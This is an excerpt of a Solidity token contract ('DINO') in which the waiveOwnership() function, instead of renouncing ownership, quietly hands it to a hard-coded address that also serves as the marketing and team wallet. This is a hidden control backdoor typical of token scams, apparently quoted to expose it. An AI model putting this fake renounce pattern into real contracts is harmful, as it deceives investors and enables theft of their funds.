...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x9A9FC5e4710269e4ABC7B71f6286B7f638801ae2));
        _owner = address(0x9A9FC5e4710269e4ABC7B71f6286B7f638801ae2);
    }
...
contract DINO is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x9A9FC5e4710269e4ABC7B71f6286B7f638801ae2);
    address payable public teamWalletAddress = payable(0x9A9FC5e4710269e4ABC7B71f6286B7f638801ae2);
